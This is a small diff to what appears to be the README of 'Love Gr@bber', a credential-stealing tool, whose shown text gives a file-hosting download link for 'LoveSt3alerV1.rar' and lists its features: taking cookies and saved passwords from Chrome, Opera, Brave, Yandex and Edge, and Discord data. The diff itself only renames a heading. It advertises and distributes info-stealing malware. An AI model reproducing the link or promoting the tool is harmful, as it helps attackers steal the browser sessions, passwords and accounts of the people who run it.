@@ -2,7 +2,7 @@ Love Gr@bber
 
 [Download Here](https://www.mediafire.com/file/0utm7idgc7nmjt3/LoveSt3alerV1.rar/file)
 
-Other Functions:
+Functions:
 
  - 🍪 Cookies: Google Chrome, Opera/Opera GX, Brave, Yandex, Microsoft Edge (Auto Parsed)
  - 🔑 Passw0rd: Google Chrome, Opera/Opera GX, Brave, Yandex, Microsoft Edge, and all Discord App
